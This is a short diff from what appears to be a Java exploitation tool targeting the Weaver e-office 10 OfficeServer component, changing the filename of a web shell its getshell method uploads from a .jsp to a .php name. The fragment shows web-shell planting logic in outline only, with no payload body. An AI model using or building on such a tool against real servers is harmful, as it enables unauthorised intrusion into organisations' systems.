@@ -17,7 +17,7 @@ public class weaveroa_eoffice10_OfficeServer implements Exploitlnterface {
 
     @Override
     public Boolean getshell(String url, TextArea textArea) {
-        Boolean att = att(url,textArea,"nishizhu.jsp",shell.Phppath);
+        Boolean att = att(url,textArea,"nishizhu.php",shell.Phppath);
         return att;
     }
 
